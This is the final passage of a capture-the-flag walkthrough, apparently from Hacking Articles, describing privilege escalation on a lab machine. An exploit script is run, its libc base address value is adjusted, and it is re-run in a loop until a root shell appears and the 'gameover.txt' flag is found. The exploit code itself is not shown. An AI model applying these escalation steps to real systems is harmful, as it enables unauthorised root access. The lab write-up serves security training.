<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6jYfs5euonE/XdtwraZJa7I/AAAAAAAAhl0/pDYloY9gWtUc8pNWNSG-daDtf7irdbFAwCLcBGAsYHQ/s1600/41.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privilege Escalation</strong></span></h3>
<p><span style="color: #000000;">Now we can test our exploit and see if we can scale privileges. To do this, we can execute it with the following command:</span></p>
<pre class="lang:default decode:true ">python xpl.py</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-e-3CwLmmKU4/XdtwsDla22I/AAAAAAAAhl8/hAv4UprXjJIgxdL5-gjc8FGvtfXse6f0QCLcBGAsYHQ/s1600/43.png"/></span></p>
<p><span style="color: #000000;">If after running the exploit, do not load the shell “sh”. We can change the value of the “base_addr” variable. This is the corresponding value for “Libc Base Address”. We can use the command we already saw for this, or simply run the exploit again to try to get root access.</span></p>
<p><span style="color: #000000;">After performing the payload, wait a few seconds. Since no feedback text has been added to your screen, the while loop will keep trying until you can inject the payload.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-onRSVZWVfzQ/XdtwsfpZFKI/AAAAAAAAhmA/t03wUb6lJEkYgbZI4jH47V6nebxRiTmtgCLcBGAsYHQ/s1600/44.png"/></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mDyka5Rh8cg/XdtwsndSYwI/AAAAAAAAhmE/3DgB5FOK9GE5PzvmKI4tATB8dW2Le9cFgCLcBGAsYHQ/s1600/45.png"/></span></p>
<p><span style="color: #000000;">We can see that there is a file named “gameover.txt” inside the “root user” directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rBn3N_aoLAU/XdtwtIgFiDI/AAAAAAAAhmI/NlKLh9mojPI6hhIatlhqnIZtDC97Dcp7QCLcBGAsYHQ/s1600/46.png"/></span></p>
<h3><span style="color: #800000;"><strong>Final Considerations</strong></span></h3>
<p><span style="color: #000000;">We hope this guide has contributed to your learning and knowledge and if possible shares with your network of friends and partners.</span></p>
<p><span style="color: #000000;">Thanks for your patience in reading this walkthrough until the end !!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: <strong>André Henrique</strong> is a Cybersecurity and IT Consultant, Network Security Specialist, Pentester, Speaker and Writer at Hacking Articles. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/mrhenrike/"><strong>Here</strong></a>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
